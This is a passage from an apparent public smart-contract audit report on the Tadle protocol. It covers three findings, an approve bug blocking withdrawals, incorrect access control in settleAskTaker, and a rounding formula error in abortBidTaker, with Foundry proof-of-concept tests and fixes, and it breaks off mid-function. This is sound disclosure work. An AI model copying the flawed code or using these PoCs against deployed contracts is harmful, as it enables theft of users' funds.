_Submitted by [juan](https://profiles.cyfrin.io/u/juan), [holydevoti0n](https://profiles.cyfrin.io/u/holydevoti0n), [0x5chn0uf](https://profiles.cyfrin.io/u/0x5chn0uf), [auditweiler](https://profiles.cyfrin.io/u/auditweiler), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [0xlrivo](https://profiles.cyfrin.io/u/0xlrivo), [shaflow01](https://profiles.cyfrin.io/u/shaflow01), [bengalcatbalu](https://profiles.cyfrin.io/u/bengalcatbalu), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [v1vah0us3](https://profiles.cyfrin.io/u/v1vah0us3), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [n0kto](https://profiles.cyfrin.io/u/n0kto), [4lifemen](https://profiles.cyfrin.io/u/4lifemen), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [danielarmstrong](https://profiles.cyfrin.io/u/danielarmstrong), [izcoser](https://profiles.cyfrin.io/u/izcoser), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [matrox](https://profiles.cyfrin.io/u/matrox), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [0xpep7](https://profiles.cyfrin.io/u/0xpep7), [eeyore](https://profiles.cyfrin.io/u/eeyore), [adeolu](https://profiles.cyfrin.io/u/adeolu), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [lazydog](https://profiles.cyfrin.io/u/lazydog), [ragnarok](https://profiles.cyfrin.io/u/ragnarok), [ke1cam](https://profiles.cyfrin.io/u/ke1cam), [tinnohofficial](https://profiles.cyfrin.io/u/tinnohofficial), [irondevx](https://profiles.cyfrin.io/u/irondevx), [MinhTriet](https://profiles.cyfrin.io/u/MinhTriet), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [mikebello](https://profiles.cyfrin.io/u/mikebello), [aksoy](https://profiles.cyfrin.io/u/aksoy), [wickie](https://profiles.cyfrin.io/u/wickie), [demorextess](https://profiles.cyfrin.io/u/demorextess), [ivanfitro](https://profiles.cyfrin.io/u/ivanfitro), [izuman](https://profiles.cyfrin.io/u/izuman), [almantare](https://profiles.cyfrin.io/u/almantare), [fyamf](https://profiles.cyfrin.io/u/fyamf), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [pina](https://profiles.cyfrin.io/u/pina), [0xleadwizard](https://profiles.cyfrin.io/u/0xleadwizard), [rio1101](https://profiles.cyfrin.io/u/rio1101), [praise03](https://profiles.cyfrin.io/u/praise03), [turvec](https://profiles.cyfrin.io/u/turvec), [0xaman](https://profiles.cyfrin.io/u/0xaman), [abhishekthakur](https://profiles.cyfrin.io/u/abhishekthakur), [hunter_w3b](https://profiles.cyfrin.io/u/hunter_w3b), [marswhitehacker](https://profiles.cyfrin.io/u/marswhitehacker), [h2134](https://profiles.cyfrin.io/u/h2134), [bkweb3](https://profiles.cyfrin.io/u/bkweb3), [atharv181](https://profiles.cyfrin.io/u/atharv181), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [rbserver](https://profiles.cyfrin.io/u/rbserver), [Chad0](https://profiles.cyfrin.io/u/Chad0), [dinkras](https://profiles.cyfrin.io/u/dinkras), [0xsecuri](https://profiles.cyfrin.io/u/0xsecuri), [amaron](https://profiles.cyfrin.io/u/amaron), [ge6a](https://profiles.cyfrin.io/u/ge6a), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [0x1912](https://profiles.cyfrin.io/u/0x1912), [tnevler](https://profiles.cyfrin.io/u/tnevler), [Ward](https://codehawks.cyfrin.io/team/clr5ch8nz0001whgxzd0o1ecx), [0xshoonya](https://profiles.cyfrin.io/u/0xshoonya), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [air](https://profiles.cyfrin.io/u/air), [recursiveeth](https://profiles.cyfrin.io/u/recursiveeth), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [honour](https://profiles.cyfrin.io/u/honour), [bladesec](https://profiles.cyfrin.io/u/bladesec), [dimah7](https://profiles.cyfrin.io/u/dimah7), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [dipp](https://profiles.cyfrin.io/u/dipp), [kamensec](https://profiles.cyfrin.io/u/kamensec), [0xmakeouthill](https://profiles.cyfrin.io/u/0xmakeouthill), [gkrastenov](https://profiles.cyfrin.io/u/gkrastenov), [_frolic](https://profiles.cyfrin.io/u/_frolic), [nilay27](https://profiles.cyfrin.io/u/nilay27), [Audittens](https://profiles.cyfrin.io/u/Audittens), [azanux](https://profiles.cyfrin.io/u/azanux), [audinarey](https://profiles.cyfrin.io/u/audinarey), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [sakar](https://profiles.cyfrin.io/u/sakar). Selected submission by: [izcoser](https://profiles.cyfrin.io/u/izcoser)._      
            


## Summary

TokenManager::withdraw uses a spending allowance on the capital pool to move its funds.

When doing a withdrawal, the internal function TokerManager::\_transfer checks for this allowance and attempts to approve spending, but incorrectly passes address(this) instead of the token address.

Hence, withdrawal fails.

## Vulnerability Details

Let us use a simple example of creating an offer, closing it and attempting to withdraw.

```Solidity
    function test_native_token_withdrawal_fails() public {
        deal(user, INITIAL_TOKEN_VALUE);

        vm.startPrank(user);
        preMarktes.createOffer{value: 0.012 * 1e18}(
            CreateOfferParams(
                marketPlace,
                address(weth9),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Ask,
                OfferSettleType.Turbo
            )
        );

        // Close the offer.
        address offerAddr = GenerateAddress.generateOfferAddress(0);
        address stockAddr = GenerateAddress.generateStockAddress(0);

        preMarktes.closeOffer(stockAddr, offerAddr);

        tokenManager.withdraw(address(weth9), TokenBalanceType.MakerRefund);
        vm.stopPrank();
    }
```

We get:

```Solidity
    │   │   ├─ [9999] UpgradeableProxy::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39])
    │   │   │   ├─ [4983] CapitalPool::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39]) [delegatecall]
    │   │   │   │   ├─ [534] TadleFactory::relatedContracts(5) [staticcall]
    │   │   │   │   │   └─ ← [Return] UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39]
    │   │   │   │   ├─ [708] UpgradeableProxy::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77])
    │   │   │   │   │   ├─ [192] TokenManager::approve(UpgradeableProxy: [0x6891e60906DEBeA401F670D74d01D117a3bEAD39], 115792089237316195423570985008687907853269984665640564039457584007913129639935 [1.157e77]) [delegatecall]
    │   │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   │   └─ ← [Revert] EvmError: Revert
    │   │   │   │   └─ ← [Revert] ApproveFailed()
```

This approve fails because we're calling approve on a non-ERC20 contract, the function simply does not exist.

Here is the mistake, in TokenManager::\_transfer:

```Solidity
    function _transfer(
        address _token,
        address _from,
        address _to,
        uint256 _amount,
        address _capitalPoolAddr
    ) internal {
        uint256 fromBalanceBef = IERC20(_token).balanceOf(_from);
        uint256 toBalanceBef = IERC20(_token).balanceOf(_to);

        if (
            _from == _capitalPoolAddr &&
            IERC20(_token).allowance(_from, address(this)) == 0x0
        ) {
            ICapitalPool(_capitalPoolAddr).approve(address(this));
        }
```

address(this) is TokenManager itself, but CapitalPool::approve expects a token address.

## Impact

No funds are at risk, but people won't be able to withdraw native tokens until someone manually calls the approve correctly. **Because there's a disruption of protocol functionality**, I'm submitting this as MEDIUM.

## Tools Used

Forge.

## Recommendations

Change ICapitalPool(\_capitalPoolAddr).approve(address(this)) to ICapitalPool(\_capitalPoolAddr).approve(\_token) in line 247, TokenManager.sol.

## <a id='H-05'></a>H-05. `DeliveryPlace::settleAskTaker` Has Incorrect Access Control

_Submitted by [p0wd3r](https://profiles.cyfrin.io/u/p0wd3r), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [4rdiii](https://profiles.cyfrin.io/u/4rdiii), [touthang](https://profiles.cyfrin.io/u/touthang), [eeyore](https://profiles.cyfrin.io/u/eeyore), [matrox](https://profiles.cyfrin.io/u/matrox), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [radin100](https://profiles.cyfrin.io/u/radin100), [vinica_boy](https://profiles.cyfrin.io/u/vinica_boy), [noone7777](https://profiles.cyfrin.io/u/noone7777), [irondevx](https://profiles.cyfrin.io/u/irondevx), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [h2134](https://profiles.cyfrin.io/u/h2134), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [fyamf](https://profiles.cyfrin.io/u/fyamf), [wellbyt3](https://profiles.cyfrin.io/u/wellbyt3), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [meeve](https://profiles.cyfrin.io/u/meeve), [0xb0k0](https://profiles.cyfrin.io/u/0xb0k0), [pro_king](https://profiles.cyfrin.io/u/pro_king), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [josh4324](https://profiles.cyfrin.io/u/josh4324), [stanchev](https://profiles.cyfrin.io/u/stanchev), [Zealynx](https://codehawks.cyfrin.io/team/clt8owsuc0001dt11do7vyoi3), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [Chad0](https://profiles.cyfrin.io/u/Chad0), [atharv181](https://profiles.cyfrin.io/u/atharv181), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [pascal](https://profiles.cyfrin.io/u/pascal), [_frolic](https://profiles.cyfrin.io/u/_frolic), [honour](https://profiles.cyfrin.io/u/honour), [ge6a](https://profiles.cyfrin.io/u/ge6a), [izuman](https://profiles.cyfrin.io/u/izuman), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [bladesec](https://profiles.cyfrin.io/u/bladesec), [avci](https://profiles.cyfrin.io/u/avci), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [mikebello](https://profiles.cyfrin.io/u/mikebello), [0xrststn](https://profiles.cyfrin.io/u/0xrststn), [0xphantom](https://profiles.cyfrin.io/u/0xphantom), [pontifex](https://profiles.cyfrin.io/u/pontifex). Selected submission by: [4rdiii](https://profiles.cyfrin.io/u/4rdiii)._      
            


# \[H-05] `DeliveryPlace::settleAskTaker` Has Incorrect Access Control

## Summary

The `settleAskTaker` function is designed to allow a stock owner to finalize a transaction by transferring points tokens from the stock owner to the buyer. According to the documentation, only the stock authority should be able to call this function. However, the current implementation checks if the caller is the offer authority, which contradicts the documented behavior and intended functionality. This discrepancy prevents the stock owner from finalizing transactions and can lead to unintended consequences if the offer owner mistakenly calls this function.

## Vulnerability Details

The core issue lies in the access control check within the `settleAskTaker` function, where the caller is incorrectly verified against the offer authority instead of the stock authority. This misalignment between the documentation and code leads to incorrect authorization checks.

```javascript
    /**
     * @notice Settle ask taker
@>   * @dev caller must be stock authority
     * @dev market place status must be AskSettling
     * @param _stock stock address
     * @param _settledPoints settled points
     * @notice _settledPoints must be less than or equal to stock points
     */
    function settleAskTaker(address _stock, uint256 _settledPoints) external {
        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            MarketPlaceInfo memory marketPlaceInfo,
            MarketPlaceStatus status
        ) = getOfferInfo(stockInfo.preOffer);

        if (stockInfo.stockStatus != StockStatus.Initialized) {
            revert InvalidStockStatus();
        }

        if (marketPlaceInfo.fixedratio) {
            revert FixedRatioUnsupported();
        }
        if (stockInfo.stockType == StockType.Bid) {
            revert InvalidStockType();
        }
        if (_settledPoints > stockInfo.points) {
            revert InvalidPoints();
        }

@>      if (status == MarketPlaceStatus.AskSettling) {
@>          if (_msgSender() != offerInfo.authority) {
@>              revert Errors.Unauthorized();
            }
        } else {
            if (_msgSender() != owner()) {
                revert Errors.Unauthorized();
            }
            if (_settledPoints > 0) {
                revert InvalidPoints();
            }
        }
        .
        .
        .
    }
```

## Impact

This flaw prevents stock owners from properly finalizing transactions, leading to potential loss of points. Additionally, if an offer owner mistakenly calls this function, they could lose points instead of acquiring them.
note that the current exsiting test `test_create_bid_offer_turbo_usdc` is completly wrong but still works because of lack of assertations and checks. the correct version of test exists in POC.

## Proof of Concept

in original test, user makes both offer and calls createTaker which is wrong since you cant both buy and sell points, in edited version user2 is the one selling the points as a result he should be the called of settleAskTaker which you can see as a result of this the call will revert with unAuthorized.
The provided test case demonstrates the incorrect behavior when a user attempts to finalize a bid offer instead of a stock sale, highlighting the need for correcting the access control logic.
Here is the corrected version of `test_create_bid_offer_turbo_usdc` test:

```javascript
    function test_create_bid_offer_turbo_usdc() public {
        vm.prank(user);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                address(mockUSDCToken),
                1000,
                0.01 * 1e18,
                12000,
                300,
                OfferType.Bid,
                OfferSettleType.Turbo
            )
        );
        address offerAddr = GenerateAddress.generateOfferAddress(0);

        vm.prank(user2);
        preMarktes.createTaker(offerAddr, 1000);

        address stock1Addr = GenerateAddress.generateStockAddress(1);

        vm.prank(user1);
        systemConfig.updateMarket(
            "Backpack",
            address(mockPointToken),
            0.01 * 1e18,
            block.timestamp - 1,
            3600
        );

        vm.startPrank(user2);
        uint256 PointsBalanceBefore = mockPointToken.balanceOf(user2);
        mockPointToken.approve(address(tokenManager), 10000 * 10 ** 18);
        vm.expectRevert(Errors.Unauthorized.selector);
        deliveryPlace.settleAskTaker(stock1Addr, 1000);
    }
```

## Tools Used

Manual Review

## Recommendations

To address this issue, the access control check should be corrected to verify the caller against the stock authority, aligning with the intended functionality and documentation.

```diff
    function settleAskTaker(address _stock, uint256 _settledPoints) external {
        IPerMarkets perMarkets = tadleFactory.getPerMarkets();
        StockInfo memory stockInfo = perMarkets.getStockInfo(_stock);

        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            MarketPlaceInfo memory marketPlaceInfo,
            MarketPlaceStatus status
        ) = getOfferInfo(stockInfo.preOffer);

        if (stockInfo.stockStatus != StockStatus.Initialized) {
            revert InvalidStockStatus();
        }

        if (marketPlaceInfo.fixedratio) {
            revert FixedRatioUnsupported();
        }
        if (stockInfo.stockType == StockType.Bid) {
            revert InvalidStockType();
        }
        if (_settledPoints > stockInfo.points) {
            revert InvalidPoints();
        }

        if (status == MarketPlaceStatus.AskSettling) {
-           if (_msgSender() != offerInfo.authority) {
+           if (_msgSender() != stockInfo.authority) {

                revert Errors.Unauthorized();
            }
        } else {
            if (_msgSender() != owner()) {
                revert Errors.Unauthorized();
            }
            if (_settledPoints > 0) {
                revert InvalidPoints();
            }
        }
        .
        .
        .
    }
```

## <a id='H-06'></a>H-06. Formulaic Error Rounds Down Causing Total Loss Of Funds For Bid Takers During Abort

_Submitted by [tigerfrake](https://profiles.cyfrin.io/u/tigerfrake), [4gontuk](https://profiles.cyfrin.io/u/4gontuk), [danielwang8824](https://profiles.cyfrin.io/u/danielwang8824), [oxelmiguel](https://profiles.cyfrin.io/u/oxelmiguel), [heaven1024](https://profiles.cyfrin.io/u/heaven1024), [Tomas0707](https://profiles.cyfrin.io/u/Tomas0707), [Bauer](https://profiles.cyfrin.io/u/Bauer), [charlescheerful](https://profiles.cyfrin.io/u/charlescheerful), [eeyore](https://profiles.cyfrin.io/u/eeyore), [jennifersun](https://profiles.cyfrin.io/u/jennifersun), [x18a6](https://profiles.cyfrin.io/u/x18a6), [z3r0](https://profiles.cyfrin.io/u/z3r0), [radin100](https://profiles.cyfrin.io/u/radin100), [joicygiore](https://profiles.cyfrin.io/u/joicygiore), [robertodf99](https://profiles.cyfrin.io/u/robertodf99), [0xHunter](https://profiles.cyfrin.io/u/0xHunter), [0xnbvc](https://profiles.cyfrin.io/u/0xnbvc), [touthang](https://profiles.cyfrin.io/u/touthang), [joyboy03](https://profiles.cyfrin.io/u/joyboy03), [bigsam](https://profiles.cyfrin.io/u/bigsam), [matejdb](https://profiles.cyfrin.io/u/matejdb), [0xbrivan2](https://profiles.cyfrin.io/u/0xbrivan2), [fyamf](https://profiles.cyfrin.io/u/fyamf), [dustinhuel2](https://profiles.cyfrin.io/u/dustinhuel2), [cryptomoon](https://profiles.cyfrin.io/u/cryptomoon), [dadekuma](https://profiles.cyfrin.io/u/dadekuma), [Hrom131](https://profiles.cyfrin.io/u/Hrom131), [josh4324](https://profiles.cyfrin.io/u/josh4324), [turvec](https://profiles.cyfrin.io/u/turvec), [0xaraj](https://profiles.cyfrin.io/u/0xaraj), [anonymousjoe](https://profiles.cyfrin.io/u/anonymousjoe), [VaRuN](https://profiles.cyfrin.io/u/VaRuN), [aksoy](https://profiles.cyfrin.io/u/aksoy), [stanchev](https://profiles.cyfrin.io/u/stanchev), [0xlookman](https://profiles.cyfrin.io/u/0xlookman), [baz1ka](https://profiles.cyfrin.io/u/baz1ka), [pascal](https://profiles.cyfrin.io/u/pascal), [rbserver](https://profiles.cyfrin.io/u/rbserver), [krisrenzo](https://profiles.cyfrin.io/u/krisrenzo), [amaron](https://profiles.cyfrin.io/u/amaron), [_frolic](https://profiles.cyfrin.io/u/_frolic), [inzinko](https://profiles.cyfrin.io/u/inzinko), [simon0417](https://profiles.cyfrin.io/u/simon0417), [ge6a](https://profiles.cyfrin.io/u/ge6a), [honour](https://profiles.cyfrin.io/u/honour), [kamensec](https://profiles.cyfrin.io/u/kamensec), [0x1912](https://profiles.cyfrin.io/u/0x1912), [bladesec](https://profiles.cyfrin.io/u/bladesec), [philbugcatcher](https://profiles.cyfrin.io/u/philbugcatcher), [brutalclowney](https://profiles.cyfrin.io/u/brutalclowney), [kupiasec](https://profiles.cyfrin.io/u/kupiasec), [itsabinashb](https://profiles.cyfrin.io/u/itsabinashb), [shikhar229169](https://profiles.cyfrin.io/u/shikhar229169), [Audittens](https://profiles.cyfrin.io/u/Audittens), [Fortis Audits](https://codehawks.cyfrin.io/team/cly2eas2s000gpgez427qfcw9). Selected submission by: [kamensec](https://profiles.cyfrin.io/u/kamensec)._      
            


## Summary

A critical vulnerability exists in the `abortBidTaker()` function where an incorrect calculation leads to rounding errors, potentially causing
takers to lose all their deposited funds during bid abortion.

## Vulnerability Details
### Overview
The vulnerability stems from an incorrect formula used in the `abortBidTaker()` function where the deposit amount is calculated as follows:
`uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.points, preOfferInfo.amount, Math.Rounding.Floor);`. 
This formula is incorrect and should be `uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.amount, preOfferInfo.points, Math.Rounding.Floor);` as can be seen in the following
[correct implementation](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L212-L216).

As the numerator and denominator are switched [here](https://github.com/Cyfrin/2024-08-tadle/blob/04fd8634701697184a3f3a5558b41c109866e5f8/src/core/PreMarkets.sol#L671-L675), the deposit amount can easily be rounded to zero causing direct loss of funds for the taker.


### Proof of Concept
Please run the following test to reproduce the issue: `forge test --via-ir --mt testTakerTotalBalancesOnOfferCancellationAndAbort`
As noted in the audit tags, offending lines can be changed to fixed implementation, however this requires adding the recommendations to the src/core/PreMarkets.sol file.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "../src/core/PreMarkets.sol";
import "../src/libraries/GenerateAddress.sol";
import "../src/libraries/Constants.sol";
import "../src/interfaces/ITokenManager.sol";
import "../src/interfaces/ISystemConfig.sol";
import {MockERC20Token} from "./mocks/MockERC20Token.sol";
import {SystemConfig} from "../src/core/SystemConfig.sol";
import {CapitalPool} from "../src/core/CapitalPool.sol";
import {TokenManager} from "../src/core/TokenManager.sol";
import {PreMarktes} from "../src/core/PreMarkets.sol";
import {DeliveryPlace} from "../src/core/DeliveryPlace.sol";
import {TadleFactory} from "../src/factory/TadleFactory.sol";
import {WETH9} from "./mocks/WETH9.sol";
contract IssueTestTemplate is Test {
    SystemConfig systemConfig;
    CapitalPool capitalPool;
    TokenManager tokenManager;
    PreMarktes preMarktes;
    DeliveryPlace deliveryPlace;

    address marketPlace;
    string marketPlaceName = "Backpack";
    WETH9 weth9;
    MockERC20Token mockUSDCToken;
    MockERC20Token mockPointToken;

    address guardian;
    address maker;
    address taker1;
    address taker2;
    address taker3;

    uint256 basePlatformFeeRate = 5_000;
    uint256 baseReferralRate = 300_000;

    bytes4 private constant INITIALIZE_OWNERSHIP_SELECTOR =
        bytes4(keccak256(bytes("initializeOwnership(address)")));

    function setUp() public {
        // Set up accounts
        guardian = makeAddr("guardian");
        maker = makeAddr("maker");
        taker1 = makeAddr("taker1");
        taker2 = makeAddr("taker2");
        taker3 = makeAddr("taker3");

        vm.label(guardian, "guardian");
        vm.label(maker, "maker");
        vm.label(taker1, "taker1");
        vm.label(taker2, "taker2");
        vm.label(taker3, "taker3");
        // deploy mocks
        weth9 = new WETH9();

        TadleFactory tadleFactory = new TadleFactory(guardian);

        mockUSDCToken = new MockERC20Token();
        mockPointToken = new MockERC20Token();

        SystemConfig systemConfigLogic = new SystemConfig();
        CapitalPool capitalPoolLogic = new CapitalPool();
        TokenManager tokenManagerLogic = new TokenManager();
        PreMarktes preMarktesLogic = new PreMarktes();
        DeliveryPlace deliveryPlaceLogic = new DeliveryPlace();

        bytes memory deploy_data = abi.encodeWithSelector(
            INITIALIZE_OWNERSHIP_SELECTOR,
            guardian
        );
        vm.startPrank(guardian);

        address systemConfigProxy = tadleFactory.deployUpgradeableProxy(
            1,
            address(systemConfigLogic),
            bytes(deploy_data)
        );

        address preMarktesProxy = tadleFactory.deployUpgradeableProxy(
            2,
            address(preMarktesLogic),
            bytes(deploy_data)
        );
        address deliveryPlaceProxy = tadleFactory.deployUpgradeableProxy(
            3,
            address(deliveryPlaceLogic),
            bytes(deploy_data)
        );
        address capitalPoolProxy = tadleFactory.deployUpgradeableProxy(
            4,
            address(capitalPoolLogic),
            bytes(deploy_data)
        );
        address tokenManagerProxy = tadleFactory.deployUpgradeableProxy(
            5,
            address(tokenManagerLogic),
            bytes(deploy_data)
        );

        vm.label(systemConfigProxy, "systemConfigProxy");
        vm.label(preMarktesProxy, "preMarktesProxy");
        vm.label(deliveryPlaceProxy, "deliveryPlaceProxy");
        vm.label(capitalPoolProxy, "capitalPoolProxy");
        vm.label(tokenManagerProxy, "tokenManagerProxy");

        vm.stopPrank();
        // attach logic
        systemConfig = SystemConfig(systemConfigProxy);
        capitalPool = CapitalPool(capitalPoolProxy);
        tokenManager = TokenManager(tokenManagerProxy);
        preMarktes = PreMarktes(preMarktesProxy);
        deliveryPlace = DeliveryPlace(deliveryPlaceProxy);

        vm.label(address(systemConfig), "systemConfig");
        vm.label(address(tokenManager), "tokenManager");
        vm.label(address(preMarktes), "preMarktes");
        vm.label(address(deliveryPlace), "deliveryPlace");

        vm.startPrank(guardian);
        // initialize
        systemConfig.initialize(basePlatformFeeRate, baseReferralRate);
        tokenManager.initialize(address(weth9));
        address[] memory tokenAddressList = new address[](2);

        tokenAddressList[0] = address(mockUSDCToken);
        tokenAddressList[1] = address(weth9);

        tokenManager.updateTokenWhiteListed(tokenAddressList, true);

        // create market place
        systemConfig.createMarketPlace(marketPlaceName, false);
        vm.stopPrank();

        deal(address(mockUSDCToken), maker, 100000000 * 10 ** 18);
        deal(address(mockPointToken), maker, 100000000 * 10 ** 18);
        deal(maker, 100000000 * 10 ** 18);

        deal(address(mockUSDCToken), taker1, 100000000 * 10 ** 18);
        deal(address(mockUSDCToken), taker2, 100000000 * 10 ** 18);
        deal(address(mockUSDCToken), taker3, 100000000 * 10 ** 18);

        deal(address(mockPointToken), taker2, 100000000 * 10 ** 18);

        marketPlace = GenerateAddress.generateMarketPlaceAddress("Backpack");

        vm.warp(1719826275);

        vm.prank(maker);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);

        vm.startPrank(taker2);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        mockPointToken.approve(address(tokenManager), type(uint256).max);
        vm.stopPrank();
    }


        /* @audit - POC: [rounding-causes-loss-for-big-takers.md] Taker final balances are rounded to zero during bid abortion, due to implementation flaws in the
        `abortBidTaker()` function where the deposit amount is calculated as follows:
        `uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.points, preOfferInfo.amount, Math.Rounding.Floor);`. 
        This formula is incorrect and should be `uint256 depositAmount = stockInfo.points.mulDiv(preOfferInfo.amount, preOfferInfo.points, Math.Rounding.Floor);`.

        As the numerator and denominator are switched, the deposit amount can easily be rounded to zero causing direct loss of funds for the taker.
        */
        function testTakerTotalBalancesOnOfferCancellationAndAbort() public {
            // initial state
            address referrer = makeAddr("referrer");
            uint256 totalPoints = 1000;
            uint256 purchasedPoints = 500;
            uint256 tokenAmount = 1e18;
            uint256 collateralRate = 12000;
            uint256 tradeTax = 300;
            uint256 collateralSent = tokenAmount * collateralRate / Constants.COLLATERAL_RATE_DECIMAL_SCALER;
            uint256 collateralPurchased = (collateralSent * purchasedPoints) / totalPoints;
            uint256 depositAmount = (purchasedPoints * tokenAmount) / totalPoints;

            // Verify Pre-test state
            uint256 makerInitialBalance = verifyAccountTypeBalance(address(mockUSDCToken), maker, TokenBalanceType.MakerRefund, 0);   
            assertEq(makerInitialBalance, 0, "Maker shouldn't have any refund balance");

            // Setup referral, create offer and taker
            (address offerAddr) = createOffer(maker, address(mockUSDCToken), totalPoints, tokenAmount, collateralRate, tradeTax, OfferType.Ask, OfferSettleType.Turbo);
            (uint256 initialReferrerBalance, uint256 initialTakerBalance) = createTakerAndGetInitialBalances(referrer, offerAddr, purchasedPoints);
            
            // Close Offer and Verify Maker Referral Balances
            closeOffer(maker, offerAddr);

            // Abort Offer 
            abortAskOffer(maker, GenerateAddress.generateStockAddress(0), offerAddr);
            abortBidTakerFixed(taker1, GenerateAddress.generateStockAddress(1), offerAddr); // @audit - NOTE: Change this for `abortBidTakerFixed()` to resolve failing test

            uint256 takerFinalTaxBalance = verifyAccountTypeBalance(address(mockUSDCToken), taker1, TokenBalanceType.TaxIncome, 0);  
            uint256 takerFinalSalesBalance = verifyAccountTypeBalance(address(mockUSDCToken), taker1, TokenBalanceType.SalesRevenue, 0);  
            uint256 takerFinalRefundBalance = getAccountTypeBalance(address(mockUSDCToken), taker1, TokenBalanceType.MakerRefund);
            uint256 takerFinalBalance = takerFinalSalesBalance + takerFinalTaxBalance + takerFinalRefundBalance;

            assertGe(takerFinalBalance, depositAmount, "Excess funds have been extracted during taker cancel + abort"); // @audit - REVERT: This assertion fails, as the taker's balance is rounded to zero during the abortBidTaker() function call.
        }

    // Helper functions

    function createOffer(address offerer, address tokenAddress, uint256 totalPoints, uint256 tokenAmount, uint256 collateralRate, uint256 tradeTax, OfferType offerType, OfferSettleType settleType) internal returns (address offerAddr) {
        vm.startPrank(offerer);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        preMarktes.createOffer(
            CreateOfferParams(
                marketPlace,
                tokenAddress,
                totalPoints,
                tokenAmount,
                collateralRate,
                tradeTax,
                offerType,
                settleType
            )
        );
        offerAddr = GenerateAddress.generateOfferAddress(0);
        vm.stopPrank();
        return offerAddr;
    }

    function createTakerAndGetInitialBalances(address referrer, address offerAddr, uint256 _purchasedPoints) internal returns (uint256 initialReferrerBalance, uint256 initialTakerBalance) {
        
        initialReferrerBalance = tokenManager.userTokenBalanceMap(
            referrer,
            address(mockUSDCToken),
            TokenBalanceType.ReferralBonus
        );
        initialTakerBalance = tokenManager.userTokenBalanceMap(
            taker1,
            address(mockUSDCToken),
            TokenBalanceType.ReferralBonus
        );
        
        vm.startPrank(taker1);
        mockUSDCToken.approve(address(tokenManager), type(uint256).max);
        uint256 purchasedPoints = _purchasedPoints;
        preMarktes.createTaker(offerAddr, purchasedPoints);
        vm.stopPrank();


        return (initialReferrerBalance, initialTakerBalance);
    }

    function closeOffer(address offerer, address offerAddr) internal {
        vm.prank(offerer);
        preMarktes.closeOffer(GenerateAddress.generateStockAddress(0), offerAddr);
    }

    function abortAskOffer(address offerer, address _stock, address _offer) internal {
        vm.prank(offerer);
        preMarktes.abortAskOffer(_stock, _offer);
    }

    function abortBidTaker(address offerer, address _stock, address _offer) internal {
        vm.prank(offerer);
        preMarktes.abortBidTaker(_stock, _offer);
    }
    function abortBidTakerFixed(address offerer, address _stock, address _offer) internal {
        vm.prank(offerer);
        preMarktes.abortBidTakerFixed(_stock, _offer);
    }

    function verifyAccountTypeBalance(address _token, address account, TokenBalanceType accountType, uint256 expectedBalance) internal returns(uint256 balance) {
        balance = getAccountTypeBalance(_token, account, accountType);

        console2.log("AccountType", uint256(accountType));

        assertEq(
            balance,
            expectedBalance,
            "Account should have the correct amount for account type"
        );
        return balance;
    }

    function getAccountTypeBalance(address _token, address account, TokenBalanceType accountType) public returns(uint256 balance) {
        balance = tokenManager.userTokenBalanceMap(
            account,
            _token,
            accountType
        );

        return balance;
    }

    function calculateExpectedReferralBonuses(address offerAddr, uint256 offerPoints, uint256 offerAmount, uint256 purchasedPoints) internal view returns (uint256 expectedReferrerBonus, uint256 expectedTakerBonus) {
        OfferInfo memory offerInfo = preMarktes.getOfferInfo(offerAddr);

        uint256 depositAmount = purchasedPoints * offerAmount / offerPoints;
        uint256 platformFeeRate = systemConfig.getPlatformFeeRate(taker1);
